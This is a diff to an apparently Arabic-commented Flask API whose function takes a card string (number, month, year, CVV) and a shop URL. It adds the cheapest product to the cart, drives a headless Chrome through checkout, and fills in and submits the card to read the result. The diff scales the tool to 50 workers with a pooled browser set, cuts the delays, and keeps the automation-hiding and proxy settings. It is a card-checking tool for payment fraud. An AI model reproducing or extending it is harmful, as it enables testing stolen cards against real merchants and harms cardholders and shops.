@@ -1,4 +1,4 @@
-# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة
+# app.py - ملف API خارق مع تحمل ضغط رهيب جدا
 import time
 import re
 import json
@@ -17,24 +17,161 @@ import threading
 import queue
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
+import gc
+import psutil
+import subprocess
 
 app = Flask(__name__)
 
-# ==================== إعدادات الأداء ====================
-MAX_WORKERS = 5
-REQUEST_TIMEOUT = 60
+# ==================== إعدادات الأداء الخارقة ====================
+MAX_WORKERS = 50
+REQUEST_TIMEOUT = 30
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+# ==================== إعدادات إعادة استخدام المتصفح ====================
+DRIVER_POOL = []
+POOL_LOCK = threading.Lock()
+MAX_DRIVERS = 25
+DRIVER_LAST_USED = {}
+
+# ==================== إعدادات توفير الذاكرة ====================
+MEMORY_LIMIT = 85  # نسبة الذاكرة المسموح بها
+CLEANUP_INTERVAL = 50  # عدد الطلبات قبل التنظيف
+REQUEST_COUNT = 0
+
+logging.basicConfig(level=logging.WARNING)
 logger = logging.getLogger(__name__)
+
+def check_memory():
+    """التحقق من استخدام الذاكرة"""
+    try:
+        memory = psutil.virtual_memory()
+        if memory.percent > MEMORY_LIMIT:
+            logger.warning(f"⚠️ الذاكرة مرتفعة: {memory.percent}% - جاري التنظيف...")
+            cleanup_drivers()
+            gc.collect()
+            return True
+    except:
+        pass
+    return False
+
+def cleanup_drivers():
+    """تنظيف المتصفحات غير المستخدمة"""
+    with POOL_LOCK:
+        to_remove = []
+        current_time = time.time()
+        for i, driver in enumerate(DRIVER_POOL):
+            try:
+                last_used = DRIVER_LAST_USED.get(id(driver), current_time)
+                if current_time - last_used > 30:
+                    driver.quit()
+                    to_remove.append(i)
+            except:
+                to_remove.append(i)
+        
+        for i in sorted(to_remove, reverse=True):
+            if i < len(DRIVER_POOL):
+                DRIVER_POOL.pop(i)
+        
+        logger.info(f"🧹 تم تنظيف {len(to_remove)} متصفحات")
+        gc.collect()
+
+def get_driver_from_pool():
+    """الحصول على متصفح من المجمع أو إنشاء جديد"""
+    global REQUEST_COUNT
+    REQUEST_COUNT += 1
+    
+    # تنظيف دوري
+    if REQUEST_COUNT % CLEANUP_INTERVAL == 0:
+        cleanup_drivers()
+        check_memory()
+    
+    with POOL_LOCK:
+        for driver in DRIVER_POOL:
+            try:
+                driver.current_url
+                DRIVER_LAST_USED[id(driver)] = time.time()
+                return driver
+            except:
+                continue
+        
+        if len(DRIVER_POOL) < MAX_DRIVERS:
+            driver = create_driver()
+            DRIVER_POOL.append(driver)
+            DRIVER_LAST_USED[id(driver)] = time.time()
+            return driver
+        
+        time.sleep(0.3)
+        return get_driver_from_pool()
+
+def create_driver():
+    """إنشاء متصفح جديد مع إعدادات السرعة القصوى وتوفير الذاكرة"""
+    chrome_options = Options()
+    
+    # وضع خفي
+    chrome_options.add_argument('--headless')
+    
+    # أمان واستقرار
+    chrome_options.add_argument('--no-sandbox')
+    chrome_options.add_argument('--disable-dev-shm-usage')
+    chrome_options.add_argument('--disable-gpu')
+    
+    # توفير الذاكرة
+    chrome_options.add_argument('--disable-images')
+    chrome_options.add_argument('--blink-settings=imagesEnabled=false')
+    chrome_options.add_argument('--disable-extensions')
+    chrome_options.add_argument('--disable-plugins')
+    chrome_options.add_argument('--disable-javascript')
+    
+    # تعطيل الميزات غير الضرورية
+    chrome_options.add_argument('--disable-background-networking')
+    chrome_options.add_argument('--disable-sync')
+    chrome_options.add_argument('--disable-default-apps')
+    chrome_options.add_argument('--disable-translate')
+    chrome_options.add_argument('--disable-print-preview')
+    chrome_options.add_argument('--disable-prompt-on-repost')
+    chrome_options.add_argument('--disable-hang-monitor')
+    chrome_options.add_argument('--disable-client-side-phishing-detection')
+    chrome_options.add_argument('--disable-crash-reporter')
+    chrome_options.add_argument('--disable-component-update')
+    chrome_options.add_argument('--disable-domain-reliability')
+    chrome_options.add_argument('--disable-breakpad')
+    chrome_options.add_argument('--disable-back-forward-cache')
+    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
+    chrome_options.add_argument('--disable-renderer-backgrounding')
+    chrome_options.add_argument('--disable-field-trial-config')
+    chrome_options.add_argument('--disable-ipc-flooding-protection')
+    
+    # تسريع الأداء
+    chrome_options.add_argument('--enable-features=NetworkService,NetworkServiceInProcess')
+    chrome_options.add_argument('--disable-features=TranslateUI')
+    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
+    chrome_options.add_experimental_option('useAutomationExtension', False)
+    chrome_options.add_argument('--disable-web-security')
+    chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+    chrome_options.add_argument('--disable-popup-blocking')
+    chrome_options.add_argument('--disable-notifications')
+    
+    # إعدادات الذاكرة
+    chrome_options.add_argument('--max_old_space_size=512')
+    chrome_options.add_argument('--js-flags=--max_old_space_size=512')
+    
+    service = Service(ChromeDriverManager().install())
+    driver = webdriver.Chrome(service=service, options=chrome_options)
+    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+    driver.set_page_load_timeout(10)
+    driver.implicitly_wait(2)
+    
+    return driver
 
 def ff(ccx, site):
     """
     ccx: رقم البطاقة|الشهر|السنة|cvv
-    مثال: '4918460118934875|08|2027|293'
     site: رابط الموقع
-    مثال: 'https://www.militadowatch.com/'
     """
     
     shipping_data = {
@@ -87,7 +224,7 @@ def ff(ccx, site):
             'service', 'guarantee', 'support'
         ]
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=5)
         if r.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to fetch products"}
         
@@ -126,11 +263,11 @@ def ff(ccx, site):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=5)
         if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart"}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=5)
         checkout_url = response.url
         
     except Exception as e:
@@ -139,41 +276,25 @@ def ff(ccx, site):
     # ==================== 2. تشغيل المتصفح ====================
     driver = None
     try:
-        chrome_options = Options()
-        chrome_options.add_argument('--headless')
-        chrome_options.add_argument('--no-sandbox')
-        chrome_options.add_argument('--disable-dev-shm-usage')
-        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
-        chrome_options.add_experimental_option('useAutomationExtension', False)
-        chrome_options.add_argument('--disable-web-security')
-        chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
-        chrome_options.add_argument('--disable-popup-blocking')
-        chrome_options.add_argument('--disable-gpu')
-        chrome_options.add_argument('--disable-notifications')
-        chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
-        
-        driver = webdriver.Chrome(options=chrome_options)
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        wait = WebDriverWait(driver, 15)
-        driver.set_page_load_timeout(25)
+        driver = get_driver_from_pool()
+        wait = WebDriverWait(driver, 3)
         
         driver.get(checkout_url)
-        time.sleep(2)
+        time.sleep(0.3)
         
         # ==================== 3. تعبئة الشحن ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
             email_field.clear()
             email_field.send_keys(shipping_data["email"])
-            time.sleep(1.5)
+            time.sleep(0.1)
             
             try:
                 country_select = driver.find_element(By.NAME, "countryCode")
                 current_country = country_select.get_attribute('value')
                 if current_country != "US":
                     Select(country_select).select_by_value("US")
-                    time.sleep(0.5)
+                    time.sleep(0.1)
             except:
                 pass
             
@@ -206,10 +327,10 @@ def ff(ccx, site):
                 except:
                     pass
             
-            time.sleep(0.5)
+            time.sleep(0.1)
             continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
             driver.execute_script("arguments[0].click();", continue_btn)
-            time.sleep(2)
+            time.sleep(0.3)
             
         except:
             return {"success": False, "code": None, "error": "Shipping fill failed"}
@@ -217,7 +338,7 @@ def ff(ccx, site):
         # ==================== 4. تعبئة الدفع ====================
         try:
             driver.switch_to.default_content()
-            time.sleep(0.5)
+            time.sleep(0.1)
             
             iframes = driver.find_elements(By.TAG_NAME, 'iframe')
             
@@ -247,7 +368,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["number"])
                             card_filled = True
-                            time.sleep(0.2)
+                            time.sleep(0.05)
                         
                         elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder.lower() or autocomplete == 'cc-exp'):
                             driver.execute_script("""
@@ -259,7 +380,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["expiry"])
                             expiry_filled = True
-                            time.sleep(0.2)
+                            time.sleep(0.05)
                         
                         elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder.lower() or autocomplete == 'cc-csc'):
                             driver.execute_script("""
@@ -271,7 +392,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["cvv"])
                             cvv_filled = True
-                            time.sleep(0.2)
+                            time.sleep(0.05)
                         
                         elif not name_filled and (data_field == 'name' or 'name' in placeholder.lower() or autocomplete == 'cc-name'):
                             driver.execute_script("""
@@ -283,7 +404,7 @@ def ff(ccx, site):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["name"])
                             name_filled = True
-                            time.sleep(0.2)
+                            time.sleep(0.05)
                     
                     driver.switch_to.default_content()
                     
@@ -360,11 +481,11 @@ def ff(ccx, site):
             };
             """
             driver.execute_script(script)
-            time.sleep(0.5)
+            time.sleep(0.2)
             
             # ==================== 6. الضغط على Pay ====================
             driver.switch_to.default_content()
-            time.sleep(1)
+            time.sleep(0.3)
             
             pay_selectors = [
                 "//button[contains(text(), 'Pay now')]",
@@ -427,20 +548,18 @@ def ff(ccx, site):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-             'Economy',
-             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'First', 
-            'by-items', 
-            'Standard', 
-            'Priority', 
-            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'GroundAdvantage'
-           
-             
+                'Economy',
+                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
+                'First', 
+                'by-items', 
+                'Standard', 
+                'Priority', 
+                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
+                'GroundAdvantage'
             ]
             
-            for attempt in range(10):
-                time.sleep(1.5)
+            for attempt in range(3):
+                time.sleep(0.8)
                 
                 responses = driver.execute_script("return window.allResponses || [];")
                 current_url = driver.current_url
@@ -705,9 +824,6 @@ def ff(ccx, site):
             except:
                 pass
             
-            if driver:
-                driver.quit()
-            
             if order_confirmed:
                 result_code = 'ORDER_CONFIRMED'
                 result_typename = 'OrderConfirmed'
@@ -772,8 +888,6 @@ def ff(ccx, site):
                 }
         
         except Exception as e:
-            if driver:
-                driver.quit()
             return {
                 "success": False,
                 "code": None,
@@ -787,8 +901,6 @@ def ff(ccx, site):
             }
     
     except Exception as e:
-        if driver:
-            driver.quit()
         return {
             "success": False,
             "code": None,
